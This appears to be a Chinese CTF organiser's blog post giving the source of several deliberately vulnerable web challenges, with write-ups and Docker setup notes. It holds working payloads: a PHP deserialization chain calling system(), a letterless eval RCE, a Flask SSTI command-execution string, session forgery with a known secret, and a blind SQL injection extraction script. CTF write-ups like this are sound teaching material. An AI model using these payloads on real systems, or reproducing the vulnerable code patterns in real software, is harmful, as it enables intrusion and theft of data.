+++
title = "CDUCTF2024"
slug = "cductf2024"
description = ""
date = "2024-11-03T12:16:18"
lastmod = "2024-11-03T12:16:18"
image = ""
license = ""
categories = ["赛题"]
tags = ["出题", "docker", "php", "ssti", "mysql"]
+++

# 0x01

这里我只放`Dockerfile`和`start.sh`怎么写的，以及`wp`

# 0x02 question

## ez_pop

```php
<?php
show_source(__FILE__);
error_reporting(0);
class C{
    private $name;
    private $age;
    public function __construct($name,$age)
    {
        $this->age=$age;
        $this->name=$name;
    }
    public function __destruct()
    {
        echo $this->name->me;
    }
}
class D{
    public $source;
    public $str;
    public function __toString()
    {
        eval($this->str->source);
    }
    public function __wakeup()
    {
        $this->str="baozongwi";
    }
}
class U{
    public $cmd;
    public function __invoke()
    {
        echo $this->cmd;
    }
}
class sec{
    public $p;
    public function __get($p)
    {
        $function=$this->p;
        return $function();
    }
}

if(isset($_GET['a'])){
    $b=unserialize($_GET['a']);
}
```

首先进入环境我们看到是一个`php`反序列化

分析一下链子找到是

```
C::destruct->sec::get->U::invoke->D::toString
```

绕过`wakeup`的方法是利用`fast_destruct`

写个`poc`

```php
<?php
class C{
    public $name;
}
class D{
    public $source;
    public $str;
}
class U{
    public $cmd;
}
class sec{
    public $p;
}
$a=new C();
$a->name=new sec();
$a->name->p=new U();
$a->name->p->cmd=new D();
$a->name->p->cmd->str=new D();
$a->name->p->cmd->str->source="system('tac /f*');";
$b=serialize($a);
$c=urlencode($b);
$d=str_replace("4%3A%22name","7%3A%22%00C%00name",$c);
echo $d;
```

最后的payload别忘记删除最后的`}`也就是`%7D`

## ez_RCE

```php
<?php
error_reporting(0);
show_source(__FILE__);
if (isset($_POST['cdu_sec.wi'])){
    $CDUSec=$_POST['cdu_sec.wi'];
    if(is_string($CDUSec)){
        if(!preg_match("/[a-zA-Z0-9@#%^&*:{}\-<\?>\"|`~\\\\]/",$CDUSec)){
            eval($CDUSec);
        }else{
            echo "怎么是杂鱼~~,Can you hack me?";
        }
    }else{
        echo "bushi,你连第一层都过不去？";
    }
}
```

拿到题目很明显的绕过，使用bp进行fuzz之后发现不成功，写个php脚本进行`fuzz`

```php
<?php
for ($i=32;$i<127;$i++){
        if (!preg_match("/[a-zA-Z0-9@#%^&*:{}\-<\?>\"|`~\\\\]/",chr($i))){
            echo chr($i)." ";
        }
}

```

我自己写的看着比较简单，看看人机写的

```php
<?php

// 定义正则表达式
$pattern = "/[a-zA-Z0-9@#%^&*:{}\-<\?>\"|`~\\\\]/";

// 存储未被过滤的字符
$unfilteredChars = [];

// 遍历 ASCII 码从 32 到 127
for ($i = 32; $i <= 127; $i++) {
    $char = chr($i); // 获取对应的字符
    if (!preg_match($pattern, $char)) { // 检查是否未被过滤
        $unfilteredChars[] = $char; // 添加到未过滤字符数组
    }
}

// 输出未被过滤的字符
echo "未被过滤的字符: " . implode('', $unfilteredChars) . "\n";

?>
```

```
!$'()+,./;=[]_
```

这一看就是无字母命令的了，因为有`$`和`_`，而且过滤的还比较少，能够很容易的得到数字和字母

我们的目标就是构造出这个

```
$_GET[_]($_GET[__])
```

然后`_`为函数，`__`为命令即可RCE

网上教程很多我也就不说了，自己会上网吧？不会的来找我

```
POST：
cdu[sec.wi=$_=[]._;$_=$_['_'];$_++;$_++;$_++;$__=++$_;$_++;$__=++$_.$__;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$__=$__.++$_;$_=_.$__;$$_[_]($$_[__]);
GET：
?_=system&__=whoami
```

就这样子简单的拿下了，不过拿一血的同学学习能力真挺不错哦

其中有一个小点就是传参怎么传才能传到是`cdu_sec.wi`

> 在 **PHP 8 之前** 的版本中，当参数名中含有 `.`（点号）或者`[`(下划线)时，会被自动转为 **`_`（下划线）**。如果`[`出现在参数中使得错误转换导致接下来如果该参数名中还有`非法字符`并不会继续转换成下划线`_`，但是如果参数最后出现了`]`,那么其中的非法字符还是会被正常解析(不会转换)，因为被当成了数组

## ez_flask

```python
from flask import Flask, render_template_string, render_template

app = Flask(__name__)

@app.route('/hello/')
def hello():
    return render_template('hello.html')

@app.route('/hello/<name>')
def hellodear(name):
    if "ge" in name:
        return render_template_string('hello %s' % name)
    elif "f" not in name:
        return render_template_string('hello %s' % name)
    else:
        return 'nonono!'

if __name__ == '__main__':
    app.run(host='0.0.0.0',port='5000',debug=True)  # 在生产环境中应关闭调试模式
```

过滤了`f`，其实这里很好绕过，直接来个**base64**就可以绕过了

```
/hello/{{g.pop.__globals__.__builtins__['__import__']('os').popen('echo dGFjIC9mKg==|base64 -d|sh').read()}}
```

这道题思来想去，黑盒感觉第一次学的话可能会找不到，白盒又太简单了，最后还是白盒，自己构造出来payload的师傅很不错哦

## ez_love

首先拿到源码看到

```python
from flask import Flask, session, request, jsonify, render_template_string
import os

app = Flask(__name__)
app.secret_key = 'cdusec'  # 设置一个秘密密钥

# 存储表白次数的字典
confessions = {}


# 主页
@app.route('/')
def index():
    # 初始化 session
    if 'user_id' not in session:
        session['user_id'] = 'anonymous'
    if 'is_admin' not in session:
        session['is_admin'] = 0

    user_id = session.get('user_id', 'anonymous')
    confessions_count = confessions.get(user_id, 0)

    return render_template_string('''
        <!doctype html>
        <html>
        <head>
            <title>表白墙</title>
            <link rel="stylesheet" href="{{ url_for('static', filename='styles.css') }}">
            <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
            <script src="{{ url_for('static', filename='script.js') }}"></script>
        </head>
        <body>
            <div class="background">
                <div class="container">
                    <h1>表白墙</h1>
                    <form id="confess-form">
                        <input type="text" id="confessor" name="confessor" placeholder="表白人">
                        <input type="text" id="confessee" name="confessee" placeholder="被表白人">
                        <input type="text" id="message" name="message" placeholder="请输入你的表白">
                        <button type="submit">表白</button>
                    </form>
                    <p>你已经表白 <span id="confessions-count">{{ confessions_count }}</span> 次</p>
                    <div id="flag-section" style="display:none;">
                        <p>你已经表白520次，恭喜你获得了flag！</p>
                        <form id="get-flag-form">
                            <button type="submit">获取flag</button>
                        </form>
                    </div>
                </div>
            </div>
        </body>
        </html>
    ''', confessions_count=confessions_count)


# 处理表白
@app.route('/confess', methods=['POST'])
def confess():
    confessor = request.form['confessor']
    confessee = request.form['confessee']
    message = request.form['message']
    user_id = session.get('user_id', 'anonymous')
    is_admin = session.get('is_admin', 0)

    if user_id not in confessions:
        confessions[user_id] = 0

    if is_admin == 1:
        confessions[user_id] += 1

    return jsonify(success=True, confessions=confessions[user_id])


# 获取flag
@app.route('/flag', methods=['GET', 'POST'])
def get_flag():
    user_id = session.get('user_id', 'anonymous')
    is_admin = session.get('is_admin', 0)
    key = request.args.get('key') or request.form.get('key')

    if key != 'cdusec':
        return jsonify(success=False, message="无效的密钥")

    if is_admin == 1 and user_id in confessions and confessions[user_id] >= 520:
        flag = get_flag_from_root()
        return jsonify(success=True, flag=flag)
    else:
        return jsonify(success=False, message="你还没有表白520次或不是管理员！")


# 获取根目录下的flag
def get_flag_from_root():
    flag_path = '/flag'  # 替换为实际的flag路径
    with open(flag_path, 'r') as f:
        flag = f.read().strip()
    return flag


if __name__ == '__main__':
    app.run(debug=True)
```

可以看到说是先要进行`session`伪造，网上有两种，一个是脚本还有一个就是`unsign`，我这使用`unsign`

```
flask-unsign --decode --cookie 'eyJpc19hZG1pbiI6MCwidXNlcl9pZCI6ImFub255bW91cyJ9.Zyg__g.JKhyC93300saSQ97J3gbTI5alcI' --secret 'cdusec'

flask-unsign --sign --cookie "{'is_admin': 1, 'user_id': 'anonymous'}" --secret 'cdusec'
eyJpc19hZG1pbiI6MSwidXNlcl9pZCI6ImFub255bW91cyJ9.ZyhAkw.trVpeh4rmFAbPkzFa1q2ygrONS8
```

进行伪造之后就可以表白了，有两种方式一种是写脚本还有一种就是bp的爆破模块

![1](D:/blog/source/images/achieve/202410/CDUCTF2024/QQ20241028-223413.png)

回到界面发现表白次数已经够了，那就访问`/flag`，不过还要输入一个参数

```
/flag?key=cdusec
```

这样子就拿到flag了，当然我们还可以写脚本

```python
import requests

url="http://27.25.151.48:5000/"

data={
    "confessor":"1",
    "confessee":"1",
    "message":"1"
}
headers={
    "Cookie":"session=eyJpc19hZG1pbiI6MSwidXNlcl9pZCI6ImFub255bW91cyJ9.ZyhAkw.trVpeh4rmFAbPkzFa1q2ygrONS8"
}

for i in range(1000):
    r=requests.post(url=url+"confess",data=data,headers=headers)
    print(r.text)
    if ('"confessions": 521') in r.text:break

print("Yes")
params={"key":"cdusec"}
res=requests.get(url=url+"flag",params=params,headers=headers)
print(res.text)
```

顷刻之间直接搞定

## baby_sql

测试之后发现是一个二次注入并且是盲注

```python
import requests
import re

sess = requests.Session()

url = "http://27.25.151.48:8308/"
target = ""
i = 0
for j in range(45):
    i += 1
    # payload="0'+ascii(substr((database()) from {} for 1))+'0;".format(i)
    payload = "0'+ascii(substr((select * from flag) from {} for 1))+'0;".format(i)

    register = {'email': '12{}3@qq.com'.format(i), 'username': payload, 'password': 123456}
    login = {'email': '12{}3@qq.com'.format(i), 'password': 123456}

    r1 = sess.post(url=url + 'register.php', data=register)
    r2 = sess.post(url=url + 'login.php', data=login)
    r3 = sess.post(url=url + 'index.php')
    content = r3.text

    # 捕捉ascii码
    con = re.findall('<span class="user-name">(.*?)</span>', content, re.S | re.M)
    a = int(con[0].strip())
    target += chr(a)
    print("\r" + target, end="")
```

# 0x03 Docker

## ez_pop

```dockerfile
# 使用官方 PHP 7.3.4 镜像作为基础
FROM php:7.3.4-alpine

# 设置工作目录为 /var/www/html
WORKDIR /var/www/html

# 将 PHP 文件复制到工作目录
COPY index.php /var/www/html/

# 将 start.sh 复制到根目录
COPY start.sh /

# 赋予 start.sh 执行权限
RUN chmod +x /start.sh

# 暴露容器的 9999 端口
EXPOSE 9999

# 定义容器启动时执行的命令
CMD ["/start.sh"]
```

然后`start.sh`

```sh
#!/bin/sh

# 生成动态 flag 函数
generate_flag() {
    # 使用 od 命令生成随机十六进制字符
    hex_part1=$(od -An -N4 -tx1 /dev/random | tr -d ' ' | cut -c1-8)  # 8个十六进制字符
    hex_part2=$(od -An -N2 -tx1 /dev/random | tr -d ' ' | cut -c1-4)  # 4个十六进制字符
    hex_part3=$(od -An -N2 -tx1 /dev/random | tr -d ' ' | cut -c1-4)  # 4个十六进制字符
    hex_part4=$(od -An -N2 -tx1 /dev/random | tr -d ' ' | cut -c1-4)  # 4个十六进制字符
    hex_part5=$(od -An -N6 -tx1 /dev/random | tr -d ' ' | cut -c1-12) # 12个十六进制字符

    # 组合成 flag
    echo "cdusec{${hex_part1}-${hex_part2}-${hex_part3}-${hex_part4}-${hex_part5}}"
}

# 生成 flag 并写入到根目录的 flag.txt 文件
flag=$(generate_flag)
echo "$flag" > /f1ag

# 启动 PHP 内置服务器
php -S 0.0.0.0:9999 -t /var/www/html
```

然后做成Docker

```
docker build -t ez_pop .

docker run -d -p 9999:9999 --name ez_pop_container ez_pop

docker stop eb7286a40980  && docker rm eb7286a40980 
```

导出

```
sudo docker save -o ez_pop.tar ez_pop
```

检查能不能正常运行

```
docker run -d -p 9999:9999 --name ez_pop_container ez_pop /start.sh
```

## ez_rce

这里和ez_pop的Dockerfile写的一模一样，就不再写了

```
docker build -t ez_rce .

docker run -d -p 9999:9999 --name ez_rce_container ez_rce

docker stop 41a9c1c58ed3   && docker rm 41a9c1c58ed3 

sudo docker save -o ez_rce.tar ez_rce

docker run -d -p 9999:9999 --name ez_rce_container ez_rce /start.sh
```

## ez_flask

```dockerfile
# 使用官方 Python 3.12 镜像作为基础
FROM python:3.12-slim

# 设置工作目录为 /var/www/html
WORKDIR /var/www/html

# 将 Python 文件和模板目录复制到工作目录
COPY app.py /var/www/html/
COPY requirements.txt /var/www/html/

# 复制 templates 文件夹
COPY templates/ /var/www/html/templates/

# 安装 Flask 及其依赖
RUN pip install --no-cache-dir -r requirements.txt

# 将 start.sh 复制到根目录
COPY start.sh /

# 赋予 start.sh 执行权限
RUN chmod +x /start.sh

# 暴露容器的 5000 端口
EXPOSE 5000

# 使用 JSON 数组格式定义 ENTRYPOINT
ENTRYPOINT ["/start.sh"]
```

```sh
#!/bin/sh

# 生成动态 flag 函数
generate_flag() {
    # 使用 od 命令生成随机十六进制字符
    hex_part1=$(od -An -N4 -tx1 /dev/random | tr -d ' ' | cut -c1-8)  # 8个十六进制字符
    hex_part2=$(od -An -N2 -tx1 /dev/random | tr -d ' ' | cut -c1-4)  # 4个十六进制字符
    hex_part3=$(od -An -N2 -tx1 /dev/random | tr -d ' ' | cut -c1-4)  # 4个十六进制字符
    hex_part4=$(od -An -N2 -tx1 /dev/random | tr -d ' ' | cut -c1-4)  # 4个十六进制字符
    hex_part5=$(od -An -N6 -tx1 /dev/random | tr -d ' ' | cut -c1-12) # 12个十六进制字符

    # 组合成 flag
    echo "cdusec{${hex_part1}-${hex_part2}-${hex_part3}-${hex_part4}-${hex_part5}}"
}

# 生成 flag 并写入到根目录的 flag.txt 文件
flag=$(generate_flag)
echo "$flag" > /flag.txt

# 启动 Flask 应用
exec python3 app.py
```

然后打包

```
docker build -t ez_flask .

docker run -d -p 5000:5000 --name ez_flask_container ez_flask

docker stop 44e9a4a66e35  && docker rm 44e9a4a66e35 

sudo docker save -o ez_flask.tar ez_flask

docker run -d -p 5000:5000 --name ez_flask_container ez_flask /start.sh
```

## ez_love

```dockerfile
# 使用官方 Python 3.12 镜像作为基础
FROM python:3.12-slim

# 设置工作目录为 /var/www/html
WORKDIR /var/www/html

# 将 Python 文件和模板目录复制到工作目录
COPY app.py /var/www/html/
COPY requirements.txt /var/www/html/

# 复制 templates 文件夹
COPY static /var/www/html/

# 安装 Flask 及其依赖
RUN pip install --no-cache-dir -r requirements.txt

# 将 start.sh 复制到根目录
COPY start.sh /

# 赋予 start.sh 执行权限
RUN chmod +x /start.sh

# 暴露容器的 5000 端口
EXPOSE 5000

# 使用 JSON 数组格式定义 ENTRYPOINT
ENTRYPOINT ["/start.sh"]
```

```sh
#!/bin/sh

# 生成动态 flag 函数
generate_flag() {
    # 使用 od 命令生成随机十六进制字符
    hex_part1=$(od -An -N4 -tx1 /dev/random | tr -d ' ' | cut -c1-8)  # 8个十六进制字符
    hex_part2=$(od -An -N2 -tx1 /dev/random | tr -d ' ' | cut -c1-4)  # 4个十六进制字符
    hex_part3=$(od -An -N2 -tx1 /dev/random | tr -d ' ' | cut -c1-4)  # 4个十六进制字符
    hex_part4=$(od -An -N2 -tx1 /dev/random | tr -d ' ' | cut -c1-4)  # 4个十六进制字符
    hex_part5=$(od -An -N6 -tx1 /dev/random | tr -d ' ' | cut -c1-12) # 12个十六进制字符

    # 组合成 flag
    echo "cdusec{${hex_part1}-${hex_part2}-${hex_part3}-${hex_part4}-${hex_part5}}"
}

# 生成 flag 并写入到根目录的 flag.txt 文件
flag=$(generate_flag)
echo "$flag" > /flag

# 启动 Flask 应用
exec python3 app.py
```

```
docker build -t ez_love .

docker run -d -p 5000:5000 --name ez_love_container ez_love

docker stop f6b7893d715a  && docker rm f6b7893d715a 

sudo docker save -o ez_love.tar ez_love

docker run -d -p 5000:5000 --name ez_love_container ez_love /start.sh
```

这里的时候有个问题就是我的背景图显示不出来了，查看日志

```
docker logs 4682165aa77f 
```

发现静态文件全是404，那进入容器看看

```
docker exec -it 4682165aa77f  /bin/sh

root@dkcjbRCL8kgaNGz:/表白墙# docker exec -it 4682165aa77f  /bin/sh
# ls
app.py  background.jpg  requirements.txt  script.js  styles.css
```

原来是这几个文件没有在`static`里面了而是在当前目录，改改`Dockerfile`

````dockerfile
# 使用官方 Python 3.12 镜像作为基础
FROM python:3.12-slim

# 设置工作目录为 /var/www/html
WORKDIR /var/www/html

# 将 Python 文件和模板目录复制到工作目录
COPY app.py /var/www/html/
COPY requirements.txt /var/www/html/

# 复制 templates 文件夹
COPY static /var/www/html/static

# 安装 Flask 及其依赖
RUN pip install --no-cache-dir -r requirements.txt

# 将 start.sh 复制到根目录
COPY start.sh /

# 赋予 start.sh 执行权限
RUN chmod +x /start.sh

# 暴露容器的 5000 端口
EXPOSE 5000

# 使用 JSON 数组格式定义 ENTRYPOINT
ENTRYPOINT ["/start.sh"]
````

然后就好了

## baby_sql

这里是一道原题，很有意思(~~时间赶比赛多，所以没有自己出，对不起~~)

```
https://github.com/CTFTraining/wdb_2018_unfinish
```

用的赵总的环境

```
sudo docker compose up -d
```

```yml
version: "2"

services:

  web:
    build: .
    image: ez_sql
    restart: always
    ports:
      - "0.0.0.0:8308:80"
    environment:
      - FLAG=cdusec{I_L0v3_Yo2}
```

这里由于不会设置动态flag所以进容器看看

```
docker exec -it 831af35a68a3 /bin/sh
```

发现flag其实就是yml中的环境变量

```
docker stop 7b9cc31fae6c   && docker rm 7b9cc31fae6c
```

那我们直接写一个sh来生成到环境变量里面(在`/src`)

> 搞了半天失败了，算了就这样吧，反正估计没有几个做的出来，除非刷题刷到了

```
sudo docker save -o ez_sql.tar ez_sql

docker run -d -p 8308:80 --name baby_sql_container baby_sql
```

但是这样子也不对，奇怪了那就把容器导出为镜像再导出

```
docker commit 41902a7e760c baby_sql
```

这样子就好了，我们再打包

```
sudo docker save -o baby_sql.tar baby_sql
# 看看能不能用
docker load -i baby_sql.tar
```

## chuan

```
scp root@27.25.151.48:/baby_sql.zip C:\Users\baozhongqi\Desktop\

scp -r root@27.25.151.48:/CDUCTF2024 C:\Users\baozhongqi\Desktop\


scp -r C:\Users\baozhongqi\Desktop\CDUCTF2024 root@27.25.151.48:/
```

# 0x04 鸣谢

特别感谢**CTF+**，我台子没有搭建好，紧急去找的他们，而且还不熟，结果也是帮助我们了，特别是**H师傅**他们，由于学姐失误了，一个动态靶机都弄不了，我修了也挺久还是失败了，最后得到他们的帮助，深夜测台子

